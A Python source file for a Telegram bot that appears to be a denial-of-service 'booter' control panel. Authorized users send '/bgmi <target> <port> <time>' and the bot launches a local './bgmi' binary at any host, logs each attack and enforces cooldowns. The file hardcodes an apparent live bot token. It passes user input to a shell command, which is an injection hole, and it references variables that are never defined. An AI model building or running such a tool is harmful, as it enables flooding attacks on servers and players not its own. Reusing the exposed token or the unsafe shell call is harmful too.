#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os
import time
from threading import Timer
from flask import Flask, request, jsonify


# insert your Telegram bot token here
bot = telebot.TeleBot('7460794049:AAEC_IjkiA4DvxfLFhd9XGsDiw5IMzYpr24')

# Admin user IDs
admin_id = ["6603685894"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} has been added successfully."
            else:
                response = "This user is already in the list."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only administrators are authorized to run this command."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} has been removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please specify a user ID to remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only administrators are authorized to run this command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs have been cleared successfully."
        except FileNotFoundError:
            response = "No logs found to clear."
    else:
        response = "Only administrators are authorized to run this command."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No authorized users found."
        except FileNotFoundError:
            response = "No authorized users found."
    else:
        response = "Only administrators are authorized to run this command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No logs found."
                bot.reply_to(message, response)
        else:
            response = "No logs found."
            bot.reply_to(message, response)
    else:
        response = "Only administrators are authorized to run this command."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

import datetime
import subprocess

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 Attack started on:\n🎯 Target: {target} \n⛱️ Port: {port} \n⌚ Time: {time} seconds"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 180  # 180 seconds cooldown time

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You are on cooldown. Please wait for 3 minutes before running the /bgmi command again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 151:
                response = "Error: Maximum attack duration is 150 seconds."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 210"
                subprocess.Popen(full_command, shell=True)
                return
        else:
            response = "Invalid command format. Usage: /bgmi <target> <port> <time>"
    else:
        response = "You are not authorized to use this bot."
    bot.reply_to(message, response)


@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = f"Welcome Admin! Your ID: {user_id}"
    else:
        response = "Welcome! Please enter the command or type /help for assistance."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def send_help(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = '''
        Available Commands:
        /add <userid> - Add user
        /remove <userid> - Remove user
        /allusers - List all users
        /logs - Show recent logs
        /clearlogs - Clear all logs
        /bgmi <target> <port> <time> - Start attack
        '''
    else:
        response = '''
        Available Commands:
        /id - Show your user ID
        /bgmi <target> <port> <time> - Start attack
        '''

    bot.reply_to(message, response)


@bot.message_handler(commands=['freeusers'])
def show_free_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if free_user_credits:
            response = "Free Users and their Credits:\n"
            for user, credits in free_user_credits.items():
                response += f"User ID: {user} - Credits: {credits}\n"
        else:
            response = "No free users data found."
    else:
        response = "Only administrators are authorized to run this command."
    bot.reply_to(message, response)


# Start the bot
bot.polling()
